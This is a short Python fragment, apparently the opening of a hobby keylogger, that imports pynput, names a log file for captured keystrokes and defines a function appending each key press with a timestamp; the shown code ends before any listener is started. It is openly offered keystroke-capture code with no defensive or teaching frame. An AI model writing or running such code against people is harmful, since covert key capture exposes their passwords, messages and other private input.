# Required Libraries for Key logger...
from pynput import keyboard
import os
from datetime import datetime

# Creating a log file in which all the captured key stroks are stored in it...
LOG_FILE = "logs/keystrokes.txt"

def writeToFile(key):
    with open(LOG_FILE, "a") as f:
        try:
            f.write(f"{datetime.now()} - {key.char}\n")
        except AttributeError:
            f.write(f"{datetime.now()} - {key}\n")
